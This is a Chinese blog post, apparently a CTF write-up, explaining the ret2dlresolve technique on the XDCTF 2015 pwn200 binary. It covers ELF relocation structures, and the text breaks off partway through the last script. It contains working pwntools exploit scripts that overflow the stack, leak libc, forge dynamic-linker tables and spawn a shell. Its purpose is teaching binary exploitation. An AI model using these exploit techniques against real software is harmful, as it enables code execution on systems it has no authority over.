<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="ret2dlresolve贴一下hollk师傅博客里的一张图片 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107378159?spm&#x3D;1001.2014.3001.5501  _dl_runtime_resolve(link_map_obj, reloc_index),第一个linkmap即为got表第二项，linkmap可以找到**.dy">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dlresolve">
<meta property="og:url" content="https://grxer.gitee.io/2023/07/09/ret2dlresolve/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="ret2dlresolve贴一下hollk师傅博客里的一张图片 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107378159?spm&#x3D;1001.2014.3001.5501  _dl_runtime_resolve(link_map_obj, reloc_index),第一个linkmap即为got表第二项，linkmap可以找到**.dy">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/09/ret2dlresolve/image-20230711215322463.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/09/ret2dlresolve/image-20230708121848040.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/09/ret2dlresolve/image-20230708122318087.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/07/09/ret2dlresolve/image-20230724174219575.png">
<meta property="article:published_time" content="2023-07-09T11:01:56.000Z">
<meta property="article:modified_time" content="2023-08-31T10:32:19.075Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/07/09/ret2dlresolve/image-20230711215322463.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ret2dlresolve</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 lrt">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/07/10/googlectf-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/09/risc-v-asm/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/09/ret2dlresolve/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&text=ret2dlresolve"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&is_video=false&description=ret2dlresolve"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ret2dlresolve&body=Check out this article: https://grxer.gitee.io/2023/07/09/ret2dlresolve/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&title=ret2dlresolve"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&name=ret2dlresolve&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/09/ret2dlresolve/&t=ret2dlresolve"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">1.1.</span> <span class="toc-text">32位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-RELRO"><span class="toc-number">1.1.1.</span> <span class="toc-text">NO-RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO"><span class="toc-number">1.1.2.</span> <span class="toc-text">Partial RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.3.</span> <span class="toc-text">pwntools工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">1.2.</span> <span class="toc-text">64位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-RELRO-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">NO-RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Partial RELRO</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ret2dlresolve
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-09T11:01:56.000Z" itemprop="datePublished">2023-07-09</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>贴一下hollk师傅博客里的一张图片 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501</a></p>
<p><img src="/2023/07/09/ret2dlresolve/image-20230711215322463.png" alt="image-20230711215322463"></p>
<p>_dl_runtime_resolve(link_map_obj, reloc_index),第一个linkmap即为got表第二项，linkmap可以找到**.dynamic<strong>的位置，第二个参数为即为plt里push的数，为要找的符号的重定位项在</strong>rel.plt**表里偏移，rel.plt里是Elf32_Rel结构体</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">https://www.cnblogs.com/ZIKH26/articles/15944406.html</a></p>
<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/no-relro&gt; checksec main_no_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>

<p>看了下最简单利用就是vuln函数的溢出和write泄露libc基地址，然后用onegadget拿shell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">write=elf.plt[b<span class="string">&quot;write&quot;</span>]</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(write)+p32(<span class="number">0x80485AE</span>)+p32(<span class="number">1</span>)+p32(elf.got[b<span class="number">&#x27;</span>write<span class="number">&#x27;</span>])+p32(<span class="number">0x10</span>)</span><br><span class="line">sla(b<span class="number">&#x27;</span>XDCTF2015~!\n<span class="number">&#x27;</span>,payload)</span><br><span class="line">write_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;write_ad&#x27;</span>,write_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_ad)</span><br><span class="line">base=write_ad-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">gadget=base+<span class="number">0x172841</span></span><br><span class="line">db(<span class="string">&#x27;b *0x804851A&#x27;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(gadget)</span><br><span class="line"><span class="meta"># sla(b<span class="string">&#x27;XDCTF2015~!\n&#x27;</span>,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>动态链接器会从<code>.dynamic</code> 节中索引到各个目标节，_dl_runtime_resolve延迟解析符号的地址时，是依据符号的名字进行解析的</p>
<p>我们可以改掉.dynstr来实现控制</p>
<p>.dynamic</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Sword    d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   Elf32_Word d_val;            <span class="comment">/* Integer value */</span></span><br><span class="line">   Elf32_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line"> &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/ret2dlresolve/image-20230708121848040.png" alt="image-20230708121848040"></p>
<blockquote>
<p>可以用readelf -S找到dynamic节位置，然后根据dynamic的Addr去ida里看，ida已经帮我们分析好了，不知道各位师傅还有没有更方便的方法，求告知</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readelf -S main_no_relro_32</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al </span><br><span class="line">[<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/ret2dlresolve/image-20230708122318087.png" alt="image-20230708122318087"></p>
</blockquote>
<p>伪造一个把read改为system的dynstr节来替换原来的节，read函数已经被解析放到了got里(jmp *got)，不会走_dl_runtime_resolve，所以要返回到他plt的第二条指令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta"># context.log_level=<span class="string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">p.recvuntil(b<span class="number">&#x27;</span>Welcome to XDCTF2015~!\n<span class="number">&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x08048376&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="meta"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="meta">#get the data of .dynstr section </span></span><br><span class="line">print(b<span class="number">&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">dynstr = dynstr.replace(b&quot;read&quot;,b&quot;system&quot;)#replace the section data </span></span><br><span class="line"><span class="string">print(b&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0+0x100,len(b&quot;/bin/sh\x00&quot;)) # read /bin/sh\x00</span></span><br><span class="line"><span class="string">rop.raw(0x08048376) # the second instruction of read@plt </span></span><br><span class="line"><span class="string">rop.raw(0xdeadbeef)</span></span><br><span class="line"><span class="string">rop.raw(0x080498E0+0x100)</span></span><br><span class="line"><span class="string"># print(rop.dump())</span></span><br><span class="line"><span class="string">assert(len(rop.chain())&lt;=256)</span></span><br><span class="line"><span class="string">rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span></span><br><span class="line"><span class="string">p.send(rop.chain())</span></span><br><span class="line"><span class="string">p.send(p32(0x080498E0))</span></span><br><span class="line"><span class="string">p.send(dynstr)</span></span><br><span class="line"><span class="string"># p.send(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>

<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/partial-relro&gt; checksec main_partial_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>

<p>.dynamic 节将会变成只读的</p>
<p>思路就是rop到_dl_runtime_resolve(plt0)函数配合伪造的rel.plt里的Elf32_Rel，Elf32_Rel里的r_info&gt;&gt;8指向伪造的.dynsym符号表Elf32_Sym的下标,Elf32_Sym里的st_name指向伪造的dynstr字符串表的偏移来调用任意函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p><strong>r_offset</strong>表示要修正的位置第一个字节相对于这个段的偏移</p>
<p>r_info 低8位表示要重定位类型，高24位是符号在符号表里的下标</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x804853A&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stack栈迁移</span></span><br><span class="line">bss_ad=elf.bss()</span><br><span class="line">new_stack=bss_ad+<span class="number">0x800</span>+<span class="built_in">int</span>((<span class="number">0x80487c4</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>)*<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;new_stack&#x27;</span>,new_stack)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.read(<span class="number">0</span>,new_stack,<span class="number">100</span>)</span><br><span class="line">rop.migrate(new_stack)</span><br><span class="line">sl(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">#new_stack rop data</span></span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment">#get the .plt address</span></span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynsym&#x27;</span>,dynsym)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&#x27;dynstr&#x27;</span>,dynstr)</span><br><span class="line">p(<span class="string">&#x27;plt&#x27;</span>,plt0)</span><br><span class="line"><span class="comment"># get the data of .rel.plt</span></span><br><span class="line">rel_plt_ad=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&quot;rel_plt_ad&quot;</span>,rel_plt_ad)</span><br><span class="line">rel_plt_data=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).data()</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#write_relplt_offset is the seonde parameter of _dl_runtime_resolve</span></span><br><span class="line">write_relplt_offset=rel_plt_data.find(p32(write_got))</span><br><span class="line">p(<span class="string">&#x27;write_relplt_offset&#x27;</span>,write_relplt_offset)</span><br><span class="line"><span class="comment">#在新栈的30处伪造Elf32_Rel</span></span><br><span class="line">fake_write_relplt_offset=new_stack+<span class="number">30</span>-rel_plt_ad</span><br><span class="line"><span class="comment">#在新栈的40处伪造Elf32_Sym，但是由于Elf32_Sym需要16字节所以要16字节对齐，后面需要补个偏差值align</span></span><br><span class="line">fake_sym_addr=new_stack+<span class="number">40</span></span><br><span class="line">align=<span class="number">0x10</span>-(fake_sym_addr-dynsym)&amp;<span class="number">0xf</span></span><br><span class="line"><span class="comment">#next rop the padding should be 40+align</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"><span class="comment">#伪造符号表Elf32_Sym在dynsym的下标</span></span><br><span class="line">index_dynsym=<span class="built_in">int</span>((fake_sym_addr-dynsym)/<span class="number">16</span>)</span><br><span class="line"><span class="comment">#高24位是符号在符号表里的下标，低8位为重定位类型</span></span><br><span class="line">r_info=(index_dynsym&lt;&lt;<span class="number">8</span>)|<span class="number">7</span></span><br><span class="line">fake_write_reloc=flat([write_got,r_info])</span><br><span class="line">gnu_version_addr = elf.get_section_by_name(<span class="string">&#x27;.gnu.version&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#在新栈的70处写入字符串system伪造字符串表</span></span><br><span class="line">fake_write_str_ad=new_stack+<span class="number">70</span></span><br><span class="line"><span class="comment">#Elf32_Sym.st_name的距离dynstr的偏移</span></span><br><span class="line">write_str_offset=fake_write_str_ad-dynstr</span><br><span class="line">fake_write_sym = flat([write_str_offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ndx_addr: %s&quot;</span> % <span class="built_in">hex</span>(gnu_version_addr+index_dynsym*<span class="number">2</span>))</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(fake_write_relplt_offset)</span><br><span class="line"><span class="comment"># fake ret of write</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#parameter of system</span></span><br><span class="line">rop.raw(new_stack + <span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">write_str=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line"><span class="comment"># print(len(rop.chain()))</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">30</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment">#fake_write_reloc</span></span><br><span class="line">rop.raw(fake_write_reloc)</span><br><span class="line"><span class="comment"># rop.raw(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line"><span class="comment"># print(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">40</span>+align-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(fake_write_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">70</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(write_str)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span 